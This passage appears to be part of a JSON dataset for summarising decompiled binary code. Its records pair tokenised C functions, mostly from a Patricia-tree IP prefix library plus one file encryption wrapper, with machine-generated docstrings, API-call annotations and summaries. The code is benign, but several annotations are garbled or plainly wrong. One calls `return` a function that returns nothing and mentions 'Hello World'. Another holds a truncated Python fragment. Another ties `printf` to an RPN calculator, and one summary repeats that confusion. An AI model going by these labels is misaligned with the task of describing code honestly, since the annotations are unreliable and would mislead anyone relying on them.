            "*",
            ")",
            "xp",
            ";",
            "return",
            "1",
            ";",
            "}",
            "else",
            "if",
            "(",
            "af_0",
            "=",
            "=",
            "10",
            ")",
            "{",
            "return",
            "inet_pton",
            "(",
            "10",
            ",",
            "src",
            ",",
            "dst",
            ")",
            ";",
            "}",
            "else",
            "{",
            "return",
            "-",
            "1",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "Based on the provided code snippets and the function name \"qword,\" it appears that the function is likely designed to process or manipulate quadruple-word (64-bit) data types, possibly for tasks such as arithmetic operations or data manipulation requiring large integer values.",
            "The `return` function appears to be a misnomer, as it doesn't actually return any value; instead, the snippets include code related to defining data structures, calculating distances in a scene, creating an interception context for device handling, and a simple C program's main function printing \"Hello World\"."
        ],
        "longer_label": "The provided code is a C function `my_inet_pton` intended to convert IPv4 addresses in string format to binary form, with annotations misinterpreting the function's purpose, likely originating from different code snippets or unrelated contexts."
    },
    {
        "id": 348,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "called",
            "prefix_toa2x",
            "which",
            "takes",
            "a",
            "prefix_t",
            "structure",
            ",",
            "a",
            "buffer",
            ",",
            "and",
            "a",
            "boolean",
            "flag",
            "as",
            "arguments",
            ",",
            "and",
            "returns",
            "a",
            "string",
            "representation",
            "of",
            "the",
            "prefix",
            "with",
            "or",
            "without",
            "its",
            "length",
            "."
        ],
        "code_tokens": [
            "char",
            "*",
            "FUN0",
            "prefix_toa2x",
            "(",
            "prefix_t",
            "*",
            "prefix",
            ",",
            "char",
            "*",
            "buff",
            ",",
            "int",
            "with_len",
            ")",
            "{",
            "u_int",
            "i",
            ";",
            "size_t",
            "v5",
            ";",
            "char",
            "*",
            "buffa",
            ";",
            "buffa",
            "=",
            "buff",
            ";",
            "if",
            "(",
            "!",
            "prefix",
            ")",
            "return",
            "\"(Null)\"",
            ";",
            "if",
            "(",
            "prefix",
            "-",
            ">",
            "ref_count",
            "<",
            "0",
            ")",
            "_assert_fail",
            "(",
            "\"prefix->ref_count >= 0\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x6Fu",
            ",",
            "\"prefix_toa2x\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "buff",
            ")",
            "{",
            "if",
            "(",
            "!",
            "&",
            "local_buff_4688",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "i",
            "=",
            "local_buff_4688",
            ".",
            "i",
            ";",
            "local_buff_4688",
            ".",
            "i",
            "=",
            "i",
            "+",
            "1",
            ";",
            "buffa",
            "=",
            "local_buff_4688",
            ".",
            "buffs",
            "[",
            "i",
            "&",
            "0xF",
            "]",
            ";",
            "}",
            "if",
            "(",
            "prefix",
            "-",
            ">",
            "family",
            "=",
            "=",
            "2",
            ")",
            "{",
            "if",
            "(",
            "prefix",
            "-",
            ">",
            "bitlen",
            ">",
            "0x20u",
            ")",
            "_assert_fail",
            "(",
            "\"prefix->bitlen <= sizeof(struct in_addr) * 8\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x89u",
            ",",
            "\"prefix_toa2x\"",
            ")",
            ";",
            "if",
            "(",
            "with_len",
            ")",
            "sprintf",
            "(",
            "buffa",
            ",",
            "\"%d.%d.%d.%d/%d\"",
            ",",
            "prefix",
            "-",
            ">",
            "add",
            ".",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "0",
            "]",
            ",",
            "prefix",
            "-",
            ">",
            "add",
            ".",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "1",
            "]",
            ",",
            "prefix",
            "-",
            ">",
            "add",
            ".",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "2",
            "]",
            ",",
            "prefix",
            "-",
            ">",
            "add",
            ".",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "3",
            "]",
            ",",
            "prefix",
            "-",
            ">",
            "bitlen",
            ")",
            ";",
            "else",
            "sprintf",
            "(",
            "buffa",
            ",",
            "\"%d.%d.%d.%d\"",
            ",",
            "prefix",
            "-",
            ">",
            "add",
            ".",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "0",
            "]",
            ",",
            "prefix",
            "-",
            ">",
            "add",
            ".",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "1",
            "]",
            ",",
            "prefix",
            "-",
            ">",
            "add",
            ".",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "2",
            "]",
            ",",
            "prefix",
            "-",
            ">",
            "add",
            ".",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "3",
            "]",
            ")",
            ";",
            "return",
            "buffa",
            ";",
            "}",
            "else",
            "if",
            "(",
            "prefix",
            "-",
            ">",
            "family",
            "=",
            "=",
            "10",
            ")",
            "{",
            "if",
            "(",
            "inet_ntop",
            "(",
            "10",
            ",",
            "&",
            "prefix",
            "-",
            ">",
            "add",
            ",",
            "buffa",
            ",",
            "0x30u",
            ")",
            "&",
            "&",
            "with_len",
            ")",
            "{",
            "if",
            "(",
            "prefix",
            "-",
            ">",
            "bitlen",
            ">",
            "0x80u",
            ")",
            "_assert_fail",
            "(",
            "\"prefix->bitlen <= sizeof(struct in6_addr) * 8\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x99u",
            ",",
            "\"prefix_toa2x\"",
            ")",
            ";",
            "v5",
            "=",
            "strlen",
            "(",
            "buffa",
            ")",
            ";",
            "sprintf",
            "(",
            "&",
            "buffa",
            "[",
            "v5",
            "]",
            ",",
            "\"/%d\"",
            ",",
            "prefix",
            "-",
            ">",
            "bitlen",
            ")",
            ";",
            "}",
            "return",
            "buffa",
            ";",
            "}",
            "else",
            "{",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The function `prefix_toa2x` takes a `prefix_t` pointer `prefix`, a character buffer `buff`, and an integer `with_len`, and converts the given prefix into a string representation stored in `buff`, including the prefix length if `with_len` is true, handling IPv4 and IPv6 addresses."
    },
    {
        "id": 349,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "New_Prefix2",
            "that",
            "creates",
            "a",
            "new",
            "prefix",
            "based",
            "on",
            "the",
            "input",
            "parameters",
            ",",
            "dynamically",
            "allocating",
            "memory",
            "if",
            "needed",
            ",",
            "setting",
            "default",
            "values",
            "based",
            "on",
            "address",
            "family",
            ",",
            "and",
            "incrementing",
            "reference",
            "count",
            "if",
            "memory",
            "was",
            "dynamically",
            "allocated",
            "."
        ],
        "code_tokens": [
            "prefix_t",
            "*",
            "FUN0",
            "New_Prefix2",
            "(",
            "int",
            "family",
            ",",
            "void",
            "*",
            "dest",
            ",",
            "int",
            "bitlen",
            ",",
            "prefix_t",
            "*",
            "prefix",
            ")",
            "{",
            "__int64",
            "v5",
            ";",
            "u_short",
            "v6",
            ";",
            "prefix_t",
            "*",
            "prefixa",
            ";",
            "int",
            "dynamic_allocated",
            ";",
            "__int16",
            "default_bitlen",
            ";",
            "prefixa",
            "=",
            "prefix",
            ";",
            "dynamic_allocated",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "prefix",
            ")",
            "{",
            "prefixa",
            "=",
            "(",
            "prefix_t",
            "*",
            ")",
            "malloc",
            "(",
            "0x18uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "prefixa",
            ")",
            "{",
            "syslog",
            "(",
            "24",
            ",",
            "\"New_Prefix2: can't allocate new prefix\"",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "memset",
            "(",
            "prefixa",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "prefix_t",
            ")",
            ")",
            ";",
            "dynamic_allocated",
            "=",
            "1",
            ";",
            "}",
            "if",
            "(",
            "family",
            "=",
            "=",
            "2",
            ")",
            "{",
            "default_bitlen",
            "=",
            "32",
            ";",
            "prefixa",
            "-",
            ">",
            "add",
            ".",
            "sin",
            ".",
            "s_addr",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "dest",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "family",
            "!",
            "=",
            "10",
            ")",
            "{",
            "free",
            "(",
            "prefixa",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "default_bitlen",
            "=",
            "128",
            ";",
            "v5",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "dest",
            "+",
            "1",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "prefixa",
            "-",
            ">",
            "add",
            ".",
            "sin",
            ".",
            "s_addr",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "dest",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "prefixa",
            "-",
            ">",
            "add",
            ".",
            "sin6",
            ".",
            "__u6_addr32",
            "[",
            "2",
            "]",
            "=",
            "v5",
            ";",
            "}",
            "if",
            "(",
            "bitlen",
            "<",
            "0",
            ")",
            "v6",
            "=",
            "default_bitlen",
            ";",
            "else",
            "v6",
            "=",
            "bitlen",
            ";",
            "prefixa",
            "-",
            ">",
            "bitlen",
            "=",
            "v6",
            ";",
            "prefixa",
            "-",
            ">",
            "family",
            "=",
            "family",
            ";",
            "prefixa",
            "-",
            ">",
            "ref_count",
            "=",
            "0",
            ";",
            "if",
            "(",
            "dynamic_allocated",
            ")",
            "+",
            "+",
            "prefixa",
            "-",
            ">",
            "ref_count",
            ";",
            "return",
            "prefixa",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code defines a function `New_Prefix2` which dynamically allocates memory for a prefix structure, initializes it based on the provided parameters such as family, destination, and bit length, and returns a pointer to the initialized prefix structure."
    },
    {
        "id": 350,
        "docstring_tokens": [
            "The",
            "code",
            "converts",
            "an",
            "ASCII",
            "string",
            "representing",
            "an",
            "IP",
            "address",
            "with",
            "prefix",
            "length",
            "into",
            "a",
            "prefix",
            "structure",
            ",",
            "based",
            "on",
            "the",
            "address",
            "family",
            ",",
            "and",
            "returns",
            "the",
            "result",
            "."
        ],
        "code_tokens": [
            "prefix_t",
            "*",
            "FUN0",
            "ascii2prefix",
            "(",
            "int",
            "family",
            ",",
            "char",
            "*",
            "string",
            ")",
            "{",
            "const",
            "char",
            "*",
            "stringa",
            ";",
            "in_addr",
            "sin",
            ";",
            "int",
            "result",
            ";",
            "u_long",
            "bitlen",
            ";",
            "u_long",
            "maxbitlen",
            ";",
            "char",
            "*",
            "cp",
            ";",
            "in6_addr",
            "sin6",
            ";",
            "char",
            "save",
            "[",
            "1024",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v11",
            ";",
            "stringa",
            "=",
            "string",
            ";",
            "v11",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "bitlen",
            "=",
            "0L",
            "L",
            ";",
            "maxbitlen",
            "=",
            "0L",
            "L",
            ";",
            "cp",
            "=",
            "0L",
            "L",
            ";",
            "result",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "string",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "family",
            "=",
            "=",
            "2",
            ")",
            "{",
            "maxbitlen",
            "=",
            "32L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "family",
            "!",
            "=",
            "10",
            ")",
            "{",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"unknown AFI (%d)\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "family",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "maxbitlen",
            "=",
            "128L",
            "L",
            ";",
            "}",
            "cp",
            "=",
            "strchr",
            "(",
            "string",
            ",",
            "47",
            ")",
            ";",
            "if",
            "(",
            "cp",
            ")",
            "{",
            "bitlen",
            "=",
            "atol",
            "(",
            "cp",
            "+",
            "1",
            ")",
            ";",
            "if",
            "(",
            "cp",
            "-",
            "string",
            ">",
            "1023",
            ")",
            "_assert_fail",
            "(",
            "\"cp - string < MAXLINE\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0xFCu",
            ",",
            "\"ascii2prefix\"",
            ")",
            ";",
            "memcpy",
            "(",
            "save",
            ",",
            "string",
            ",",
            "cp",
            "-",
            "string",
            ")",
            ";",
            "save",
            "[",
            "cp",
            "-",
            "string",
            "]",
            "=",
            "0",
            ";",
            "stringa",
            "=",
            "save",
            ";",
            "if",
            "(",
            "bitlen",
            ">",
            "maxbitlen",
            ")",
            "bitlen",
            "=",
            "maxbitlen",
            ";",
            "}",
            "else",
            "{",
            "bitlen",
            "=",
            "maxbitlen",
            ";",
            "}",
            "if",
            "(",
            "family",
            "=",
            "=",
            "2",
            ")",
            "{",
            "result",
            "=",
            "my_inet_pton",
            "(",
            "2",
            ",",
            "stringa",
            ",",
            "&",
            "sin",
            ")",
            ";",
            "if",
            "(",
            "result",
            ">",
            "0",
            ")",
            "return",
            "New_Prefix",
            "(",
            "2",
            ",",
            "&",
            "sin",
            ",",
            "bitlen",
            ")",
            ";",
            "else",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "if",
            "(",
            "inet_pton",
            "(",
            "10",
            ",",
            "stringa",
            ",",
            "&",
            "sin6",
            ")",
            ">",
            "0",
            ")",
            "{",
            "return",
            "New_Prefix",
            "(",
            "10",
            ",",
            "&",
            "sin6",
            ",",
            "bitlen",
            ")",
            ";",
            "}",
            "else",
            "{",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `strch` function appears to be a custom implementation of `strchr` used within various contexts for searching characters within strings in C code.",
            "The `my_inet_ntop` function is likely a custom implementation of the `inet_ntop` function used for converting network addresses from binary to text form, with additional logging and debugging functionalities."
        ],
        "longer_label": "The provided C function `ascii2prefix` converts a given string representing an IP address into a prefix structure, with custom implementations for handling IPv4 and IPv6 addresses, utilizing a custom `strch` function for string manipulation and possibly a custom `my_inet_ntop` function for address conversion."
    },
    {
        "id": 351,
        "docstring_tokens": [
            "The",
            "function",
            "Ref_Prefix",
            "increments",
            "the",
            "reference",
            "count",
            "of",
            "a",
            "given",
            "prefix",
            "and",
            "returns",
            "a",
            "new",
            "prefix",
            "if",
            "the",
            "reference",
            "count",
            "is",
            "0",
            "."
        ],
        "code_tokens": [
            "prefix_t",
            "*",
            "FUN0",
            "Ref_Prefix",
            "(",
            "prefix_t",
            "*",
            "prefix",
            ")",
            "{",
            "if",
            "(",
            "!",
            "prefix",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "!",
            "prefix",
            "-",
            ">",
            "ref_count",
            ")",
            "return",
            "New_Prefix2",
            "(",
            "prefix",
            "-",
            ">",
            "family",
            ",",
            "&",
            "prefix",
            "-",
            ">",
            "add",
            ",",
            "prefix",
            "-",
            ">",
            "bitlen",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "+",
            "+",
            "prefix",
            "-",
            ">",
            "ref_count",
            ";",
            "return",
            "prefix",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"prefix\" function appears to compare two strings character by character until they differ or one terminates, while the provided code snippets suggest it might also be involved in handling file paths or function name prefixes based on conditional macros."
        ],
        "longer_label": "The Ref_Prefix function checks if the input prefix is valid and either returns a new prefix with an incremented reference count or increments the reference count of the input prefix."
    },
    {
        "id": 352,
        "docstring_tokens": [
            "This",
            "code",
            "decrements",
            "the",
            "reference",
            "count",
            "of",
            "a",
            "prefix",
            "structure",
            "and",
            "deletes",
            "it",
            "if",
            "the",
            "count",
            "is",
            "less",
            "than",
            "or",
            "equal",
            "to",
            "0",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "prefix_t",
            "*",
            "prefix",
            ")",
            "{",
            "if",
            "(",
            "prefix",
            ")",
            "{",
            "if",
            "(",
            "prefix",
            "-",
            ">",
            "ref_count",
            "<",
            "=",
            "0",
            ")",
            "_assert_fail",
            "(",
            "\"prefix->ref_count > 0\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x12Bu",
            ",",
            "\"Deref_Prefix\"",
            ")",
            ";",
            "if",
            "(",
            "-",
            "-",
            "prefix",
            "-",
            ">",
            "ref_count",
            "<",
            "0",
            ")",
            "_assert_fail",
            "(",
            "\"prefix->ref_count >= 0\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x12Eu",
            ",",
            "\"Deref_Prefix\"",
            ")",
            ";",
            "if",
            "(",
            "prefix",
            "-",
            ">",
            "ref_count",
            "<",
            "=",
            "0",
            ")",
            "free",
            "(",
            "prefix",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `assert_` function is designed to check conditions within a program, throwing an exception if any condition fails, commonly used for debugging and ensuring program correctness."
        ],
        "longer_label": "The provided code is a function `Deref_Prefix` that decrements the reference count of a given `prefix_t` structure, asserts if the reference count becomes negative or zero, and frees the memory allocated to the structure if the reference count reaches zero."
    },
    {
        "id": 353,
        "docstring_tokens": [
            "This",
            "code",
            "creates",
            "a",
            "new",
            "instance",
            "of",
            "a",
            "Patricia",
            "tree",
            "with",
            "a",
            "specified",
            "maximum",
            "number",
            "of",
            "bits",
            "and",
            "initializes",
            "its",
            "attributes",
            ",",
            "then",
            "increments",
            "the",
            "number",
            "of",
            "active",
            "Patricia",
            "trees",
            "."
        ],
        "code_tokens": [
            "patricia_tree_t",
            "*",
            "FUN0",
            "New_Patricia",
            "(",
            "int",
            "maxbits",
            ")",
            "{",
            "patricia_tree_t",
            "*",
            "patricia",
            ";",
            "patricia",
            "=",
            "(",
            "patricia_tree_t",
            "*",
            ")",
            "calloc",
            "(",
            "1uL",
            "L",
            ",",
            "0x10uL",
            "L",
            ")",
            ";",
            "patricia",
            "-",
            ">",
            "maxbits",
            "=",
            "maxbits",
            ";",
            "patricia",
            "-",
            ">",
            "head",
            "=",
            "0L",
            "L",
            ";",
            "patricia",
            "-",
            ">",
            "num_active_node",
            "=",
            "0",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "maxbits",
            ">",
            "0x80",
            ")",
            "_assert_fail",
            "(",
            "\"maxbits <= PATRICIA_MAXBITS\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x145u",
            ",",
            "\"New_Patricia\"",
            ")",
            ";",
            "+",
            "+",
            "num_active_patricia",
            ";",
            "return",
            "patricia",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code initializes a new Patricia tree with a maximum number of bits, allocates memory for the tree, sets its attributes, checks if the maximum bits are within limits, and increments the count of active Patricia trees."
    },
    {
        "id": 354,
        "docstring_tokens": [
            "The",
            "code",
            "clears",
            "a",
            "Patricia",
            "tree",
            "structure",
            "by",
            "recursively",
            "deleting",
            "nodes",
            "and",
            "calling",
            "a",
            "specified",
            "function",
            "on",
            "the",
            "data",
            "of",
            "each",
            "node",
            ",",
            "while",
            "also",
            "ensuring",
            "that",
            "the",
            "number",
            "of",
            "active",
            "nodes",
            "in",
            "the",
            "tree",
            "is",
            "zero",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "patricia_tree_t",
            "*",
            "patricia",
            ",",
            "void_fn_t",
            "func",
            ")",
            "{",
            "patricia_node_t",
            "*",
            "*",
            "v2",
            ";",
            "patricia_node_t",
            "*",
            "*",
            "Xsp",
            ";",
            "patricia_node_t",
            "*",
            "Xrn",
            ";",
            "patricia_node_t",
            "*",
            "l",
            ";",
            "patricia_node_t",
            "*",
            "r",
            ";",
            "patricia_node_t",
            "*",
            "Xstack",
            "[",
            "129",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "v8",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "patricia",
            ")",
            "_assert_fail",
            "(",
            "\"patricia\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x153u",
            ",",
            "\"Clear_Patricia\"",
            ")",
            ";",
            "if",
            "(",
            "patricia",
            "-",
            ">",
            "head",
            ")",
            "{",
            "Xsp",
            "=",
            "Xstack",
            ";",
            "Xrn",
            "=",
            "patricia",
            "-",
            ">",
            "head",
            ";",
            "while",
            "(",
            "Xrn",
            ")",
            "{",
            "l",
            "=",
            "Xrn",
            "-",
            ">",
            "l",
            ";",
            "r",
            "=",
            "Xrn",
            "-",
            ">",
            "r",
            ";",
            "if",
            "(",
            "Xrn",
            "-",
            ">",
            "prefix",
            ")",
            "{",
            "Deref_Prefix",
            "(",
            "Xrn",
            "-",
            ">",
            "prefix",
            ")",
            ";",
            "if",
            "(",
            "Xrn",
            "-",
            ">",
            "data",
            "&",
            "&",
            "func",
            ")",
            "func",
            "(",
            "Xrn",
            "-",
            ">",
            "data",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "Xrn",
            "-",
            ">",
            "data",
            ")",
            "{",
            "_assert_fail",
            "(",
            "\"Xrn->data == NULL\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x164u",
            ",",
            "\"Clear_Patricia\"",
            ")",
            ";",
            "}",
            "free",
            "(",
            "Xrn",
            ")",
            ";",
            "-",
            "-",
            "patricia",
            "-",
            ">",
            "num_active_node",
            ";",
            "if",
            "(",
            "l",
            ")",
            "{",
            "if",
            "(",
            "r",
            ")",
            "{",
            "v2",
            "=",
            "Xsp",
            "+",
            "+",
            ";",
            "*",
            "v2",
            "=",
            "r",
            ";",
            "}",
            "Xrn",
            "=",
            "l",
            ";",
            "}",
            "else",
            "if",
            "(",
            "r",
            ")",
            "{",
            "Xrn",
            "=",
            "r",
            ";",
            "}",
            "else",
            "if",
            "(",
            "Xsp",
            "=",
            "=",
            "Xstack",
            ")",
            "{",
            "Xrn",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "Xrn",
            "=",
            "*",
            "-",
            "-",
            "Xsp",
            ";",
            "}",
            "}",
            "}",
            "if",
            "(",
            "patricia",
            "-",
            ">",
            "num_active_node",
            ")",
            "_assert_fail",
            "(",
            "\"patricia->num_active_node == 0\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x177u",
            ",",
            "\"Clear_Patricia\"",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"__read\" function appears to be utilized for reading data from devices, files, or streams, handling I/O operations such as device reads, file reads, or interacting with dump files and shared libraries, depending on the context in which it is invoked within the program.",
            "The function \"python\ndef qword():\n    \"\"\"\n    This function likely operates on quadruple-word (64-bit) data, possibly performing operations or transformations.\n    \"\"\"\n   nce of code snippets."
        ],
        "longer_label": "The provided C code is a function named \"Clear_Patricia\" designed to clear a Patricia tree structure, deallocating memory for its nodes, while invoking a specified function on each node's data if provided, and performing necessary bookkeeping, with annotations indicating the potential usage of \"__read\" for I/O operations and a separate Python function \"qword()\" possibly operating on 64-bit data."
    },
    {
        "id": 355,
        "docstring_tokens": [
            "The",
            "function",
            "Destroy_Patricia",
            "clears",
            "the",
            "patricia",
            "tree",
            "using",
            "the",
            "specified",
            "function",
            ",",
            "deletes",
            "the",
            "tree",
            ",",
            "and",
            "decrements",
            "the",
            "number",
            "of",
            "active",
            "patricia",
            "trees",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "patricia_tree_t",
            "*",
            "patricia",
            ",",
            "void_fn_t",
            "func",
            ")",
            "{",
            "Clear_Patricia",
            "(",
            "patricia",
            ",",
            "func",
            ")",
            ";",
            "free",
            "(",
            "patricia",
            ")",
            ";",
            "-",
            "-",
            "num_active_patricia",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "This function \"Clear\" is likely used to clear the content of the array \"input\" or reset it to an initial state.",
            "The function \"patricia_Create\" likely creates a data structure called a Patricia trie, with functionality for creating and managing nodes, with an option for specifying a value destructor function, facilitating efficient storage and retrieval of key-value pairs."
        ],
        "longer_label": "The code defines a function, `Destroy_Patricia`, which deallocates memory for a Patricia trie structure and decreases the count of active Patricia tries, while likely using a function called `Clear_Patricia` to clear the content of the trie before deallocation."
    },
    {
        "id": 356,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "iterates",
            "through",
            "all",
            "nodes",
            "in",
            "a",
            "Patricia",
            "tree",
            "and",
            "applies",
            "a",
            "specified",
            "function",
            "to",
            "each",
            "node",
            "'s",
            "prefix",
            "and",
            "data",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "patricia_tree_t",
            "*",
            "patricia",
            ",",
            "void_fn_t",
            "func",
            ")",
            "{",
            "_patricia_node_t",
            "*",
            "*",
            "v2",
            ";",
            "patricia_node_t",
            "*",
            "*",
            "Xsp",
            ";",
            "patricia_node_t",
            "*",
            "Xrn",
            ";",
            "patricia_node_t",
            "*",
            "Xstack",
            "[",
            "129",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "func",
            ")",
            "_assert_fail",
            "(",
            "\"func\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x18Du",
            ",",
            "\"patricia_process\"",
            ")",
            ";",
            "Xsp",
            "=",
            "Xstack",
            ";",
            "Xrn",
            "=",
            "patricia",
            "-",
            ">",
            "head",
            ";",
            "while",
            "(",
            "Xrn",
            ")",
            "{",
            "if",
            "(",
            "Xrn",
            "-",
            ">",
            "prefix",
            ")",
            "func",
            "(",
            "Xrn",
            "-",
            ">",
            "prefix",
            ",",
            "Xrn",
            "-",
            ">",
            "data",
            ")",
            ";",
            "if",
            "(",
            "Xrn",
            "-",
            ">",
            "l",
            ")",
            "{",
            "if",
            "(",
            "Xrn",
            "-",
            ">",
            "r",
            ")",
            "{",
            "v2",
            "=",
            "Xsp",
            "+",
            "+",
            ";",
            "*",
            "v2",
            "=",
            "Xrn",
            "-",
            ">",
            "r",
            ";",
            "}",
            "Xrn",
            "=",
            "Xrn",
            "-",
            ">",
            "l",
            ";",
            "}",
            "else",
            "if",
            "(",
            "Xrn",
            "-",
            ">",
            "r",
            ")",
            "{",
            "Xrn",
            "=",
            "Xrn",
            "-",
            ">",
            "r",
            ";",
            "}",
            "else",
            "if",
            "(",
            "Xsp",
            "=",
            "=",
            "Xstack",
            ")",
            "{",
            "Xrn",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "Xrn",
            "=",
            "*",
            "-",
            "-",
            "Xsp",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a function called `patricia_process` which traverses a Patricia tree and calls a specified function `func` on each node's prefix and data, utilizing a stack-based iterative traversal method."
    },
    {
        "id": 357,
        "docstring_tokens": [
            "The",
            "code",
            "opens",
            "input",
            "and",
            "output",
            "files",
            "for",
            "encryption",
            "or",
            "decryption",
            "using",
            "a",
            "specified",
            "key",
            "and",
            "initialization",
            "vector",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "input",
            ",",
            "char",
            "*",
            "output",
            ",",
            "unsigned",
            "__int8",
            "*",
            "key",
            ",",
            "unsigned",
            "__int8",
            "*",
            "iv",
            ",",
            "bool",
            "encryptfile",
            ")",
            "{",
            "FILE",
            "*",
            "cryptooutput",
            ";",
            "FILE",
            "*",
            "cryptoinput",
            ";",
            "cryptoinput",
            "=",
            "fopen",
            "(",
            "input",
            ",",
            "\"rb\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "cryptoinput",
            ")",
            "{",
            "puts",
            "(",
            "\"Could not be open for reading \"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "cryptooutput",
            "=",
            "fopen",
            "(",
            "output",
            ",",
            "\"wb\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "cryptooutput",
            ")",
            "{",
            "printf",
            "(",
            "\"Could not be opened for writing\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "encryptfile",
            ")",
            "encryptFile",
            "(",
            "cryptoinput",
            ",",
            "cryptooutput",
            ",",
            "key",
            ",",
            "iv",
            ")",
            ";",
            "else",
            "decryptFile",
            "(",
            "cryptoinput",
            ",",
            "cryptooutput",
            ",",
            "key",
            ",",
            "iv",
            ")",
            ";",
            "fclose",
            "(",
            "cryptoinput",
            ")",
            ";",
            "fclose",
            "(",
            "cryptooutput",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function, as evidenced by the provided code snippets, appears to be part of a larger program implementing a Reverse Polish Notation (RPN) calculator with additional formatting capabilities, such as handling special cases like positive infinity and NaN, and is defined with various macros and typedefs for enhanced functionality and readability.",
            "The `fclose` function is used to close a file stream, typically after writing data to it, as shown in the provided code snippets where it's used to close a file after writing data to it using `fwrite`."
        ],
        "longer_label": "The provided code defines a function `crypto` which encrypts or decrypts files based on the boolean parameter `encryptfile`, utilizing the functions `encryptFile` or `decryptFile` respectively, and handles file I/O operations with error checking for opening files."
